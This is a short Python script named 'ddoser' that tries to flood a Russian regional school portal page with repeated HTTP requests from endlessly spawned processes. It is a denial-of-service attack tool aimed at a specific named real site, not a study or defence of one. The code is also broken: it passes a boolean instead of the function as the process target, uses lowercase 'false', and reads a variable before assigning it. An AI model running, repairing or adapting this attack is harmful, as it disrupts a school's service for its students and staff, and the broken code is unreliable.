import requests
import multiprocessing

def ddoser(path):
    global ddosing
    while str(response) == "<Response [200]>":
        response = requests.get(path)
        response = requests.get(path + "/home")
    ddosing = false


path = "https://schools.school.mosreg.ru/school.aspx?school=2000000000748"

response = requests.get(path)
ddosing = True
while ddosing:
    process = multiprocessing.Process(target=ddosing, args=(path,))
    process.start()


print(response)